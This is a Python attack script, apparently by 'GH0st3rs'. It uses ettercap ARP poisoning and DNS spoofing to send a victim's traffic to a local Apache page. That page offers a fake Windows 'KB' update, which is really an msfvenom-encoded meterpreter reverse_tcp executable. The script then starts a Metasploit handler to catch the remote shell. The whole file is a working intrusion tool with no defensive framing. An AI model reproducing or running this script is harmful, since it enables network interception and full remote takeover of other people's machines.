#!/usr/bin/python

import os, optparse, sys
from random import randint
import re

def genHtmlPage(KB):
	buf = open('/srv/http/index.html', 'r').read()
	repl = set(re.findall('KB+[0-9]+', buf))
	for item in repl:
		buf = buf.replace(item, KB)
	f = open('/srv/http/index.html', 'w')
	f.write(buf)
	f.close()
	print('HTML page was replaced for %s' %(KB))

def msfLoad(LHOST, LPORT):
	f = open('/tmp/start_listen.rc', 'w')
# Setup Listener
	listen = '''use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST %s
set LPORT %s
set ExitOnSession false
exploit -j
''' %(LHOST, LPORT)
	f.write(listen)
	f.close()
	os.system('mate-terminal -e "/opt/metasploit/msfconsole -r /tmp/start_listen.rc"')


def preLoad(iface, LHOST, LPORT, RHOST, GATEWAY, KB):
	print('Restart PostgreSQL service')
	os.system('systemctl restart postgresql')
	
	print('Compile ShellEXE file')
	os.system('msfvenom -e x86/jmp_call_additive -i 20 -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > /srv/http/Windows-%s.exe' %(LHOST, LPORT, KB))

	print('Edit etter.dns')
	os.system('echo "* A %s" > /etc/ettercap/etter.dns' %(LHOST))
	
	genHtmlPage(KB)

	print('Start Apache')
	os.system('apachectl restart')

	print('\nStart Ettercap dns spoof')
	os.system('mate-terminal -e "ettercap -T -i %s -q -P dns_spoof -M arp:remote /%s/ /%s/"' %(iface, GATEWAY, RHOST))

	print('Start Metasploit listener')
	msfLoad(LHOST, LPORT)

#Function for generate shellFle name
def shellGenName():
	return 'KB%s' %(randint(10000,9999999))

def main():
	parser = optparse.OptionParser('%s -p LPORT -r RHOST -l LHOST -g GATEWAY -i interface' %(sys.argv[0]))
	parser.add_option('-p', dest='LPORT', type='string', help ='Specify a port to listen on (default 4444)')
	parser.add_option('-r', dest='RHOST', type='string', help='Specify a remote host')
	parser.add_option('-l', dest='LHOST', type='string', help='Specify a local host (default 127.0.0.1)')
	parser.add_option('-g', dest='GATEWAY', type='string', help ='Specify gateway')
	parser.add_option('-i', dest='interface', type='string', help ='Your ethernet adapter')
	(options, args) = parser.parse_args()
	RHOST = options.RHOST
	LHOST = options.LHOST or '127.0.0.1'
	LPORT = options.LPORT or '4444'
	GATEWAY = options.GATEWAY
	iface = options.interface
	
	if (iface == None) or (RHOST == None) or (LPORT == None) or (LHOST == None) or (GATEWAY == None):
		print(parser.usage)
		sys.exit(0)

	KB = shellGenName()
	preLoad(iface, LHOST, LPORT, RHOST, GATEWAY, KB)

print(' #\tAuthor: GH0st3rs\t#\n')
if __name__ == "__main__": main()
